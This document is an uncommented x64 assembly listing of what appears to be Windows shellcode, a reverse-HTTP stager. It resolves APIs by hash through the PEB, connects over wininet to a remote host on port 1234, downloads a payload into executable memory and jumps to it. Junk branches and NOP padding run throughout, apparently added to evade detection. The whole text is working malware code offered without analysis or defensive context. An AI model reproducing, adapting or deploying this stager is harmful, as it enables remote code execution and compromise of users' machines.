```asm
_start:
    cld
    and rsp, 0xfffffffffffffff0
    call L_d6
RET_a:
    push r9
    push r8
    push rdx
    push rcx
    pushfq
    push rax
    xor eax, eax
    jnz bogus_1
    jmp real_1
bogus_1:
    nop
    mov rdx, rdx
real_1:
    pop rax
    popfq
    xor rdx, rdx
    push rsi
    mov rdx, qword ptr gs:[rdx + 0x60]
    mov rdx, qword ptr [rdx + 0x18]
    mov rdx, qword ptr [rdx + 0x20]
L_21:
    movzx rcx, word ptr [rdx + 0x4a]
    mov rsi, qword ptr [rdx + 0x50]
    xor r9, r9
L_2d:
    xor rax, rax
    lodsb al, byte ptr [rsi]
    cmp al, 0x61
    jl L_37
    sub al, 0x20
L_37:
    ror r9d, 0xd
    add r9d, eax
    loop L_2d
    push rdx
    push r9
    mov rdx, qword ptr [rdx + 0x20]
    mov eax, dword ptr [rdx + 0x3c]
    add rax, rdx
    cmp word ptr [rax + 0x18], 0x20b
    jne L_cb
    mov eax, dword ptr [rax + 0x88]
    test rax, rax
    je L_cb
    add rax, rdx
    mov ecx, dword ptr [rax + 0x18]
    mov r8d, dword ptr [rax + 0x20]
    add r8, rdx
    push rax
    pushfq
    push rax
    xor eax, eax
    jnz bogus_2
    jmp real_2
bogus_2:
    nop
    mov rdx, rdx
real_2:
    pop rax
    popfq
L_72:
    jrcxz L_ca
    xor r9, r9
    dec rcx
    mov esi, dword ptr [r8 + rcx*4]
    add rsi, rdx
L_81:
    xor rax, rax
    ror r9d, 0xd
    lodsb al, byte ptr [rsi]
    add r9d, eax
    cmp al, ah
    jne L_81
    add r9, qword ptr [rsp + 8]
    cmp r9d, r10d
    jne L_72
    pop rax
    mov r8d, dword ptr [rax + 0x24]
    add r8, rdx
    mov cx, word ptr [r8 + rcx*2]
    mov r8d, dword ptr [rax + 0x1c]
    add r8, rdx
    mov eax, dword ptr [r8 + rcx*4]
    add rax, rdx
    pop r8
    pop r8
    pop rsi
    pop rcx
    pop rdx
    pop r8
    pop r9
    pop r10
    sub rsp, 0x20
    push r10
    jmp rax
L_ca:
    pop rax
    pushfq
    push rax
    xor eax, eax
    jnz bogus_3
    jmp real_3
bogus_3:
    nop
    mov rdx, rdx
real_3:
    pop rax
    popfq
L_cb:
    pop r9
    pop rdx
    mov rdx, qword ptr [rdx]
    jmp L_21
L_d6:
    pop rbp
    pushfq
    push rax
    xor eax, eax
    jnz bogus_4
    jmp real_4
bogus_4:
    nop
    mov rdx, rdx
real_4:
    pop rax
    popfq
    xor rbx, rbx
    push rbx
    movabs r14, 0x74656e696e6977
    push r14
    mov rcx, rsp
    mov r10, 0x726774c
    call rbp
    push rbx
    push rbx
    lea rcx, [rip + DATA_0]
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    push rbx
    pop rdx
    xor r8, r8
    xor r9, r9
    push rbx
    push rbx
    movabs r10, 0xa779563a
    call rbp
    lea rdx, [rip + DATA_1]
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    mov rcx, rax
    mov r8, 0x4d2
    xor r9, r9
    push rbx
    push rbx
    push 3
    push rbx
    movabs r10, 0xc69f8957
    call rbp
    jmp DATA_STUB_2
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
L_23b:
    mov rcx, rax
    push rbx
    pop rdx
    pop r8
    xor r9, r9
    push rbx
    movabs rax, 0x84280200
    push rax
    push rbx
    push rbx
    mov r10, 0x3b2e55eb
    call rbp
    mov rsi, rax
    push 0xa
    pop rdi
L_262:
    push rbx
    pop rdx
    mov rcx, rsi
    xor r9, r9
    xor r9, r9
    push rbx
    push rbx
    mov r10, 0x7b18062d
    call rbp
    test eax, eax
    jne L_29b
    mov rcx, 0x1388
    movabs r10, 0xe035f044
    call rbp
    dec rdi
    je L_296
    jmp L_262
L_296:
    call L_308
L_29b:
RET_29b:
    push rbx
    mov rdx, rsp
    push rbx
    mov r9, rsp
    push 4
    pop r8
    mov rcx, rsi
    movabs r10, 0xe2899612
    call rbp
    test eax, eax
    je L_296
    add rsp, 0x28
    push rbx
    pop rcx
    pop rdx
    mov rbx, rdx
    push 0x40
    pop r9
    mov r8, 0x1000
    movabs r10, 0xe553a458
    call rbp
    xchg rbx, rax
    push rbx
    push rbx
    mov rdi, rsp
    mov rcx, rsi
    mov r8, rax
    mov rdx, rbx
    mov r9, rdi
    movabs r10, 0xe2899612
    call rbp
    add rsp, 0x20
    test eax, eax
    je L_296
    pop rax
    ret
L_308:
    pop rax
    push 0
    pop rcx
    mov r10, 0x56a2b5f0
    call rbp
```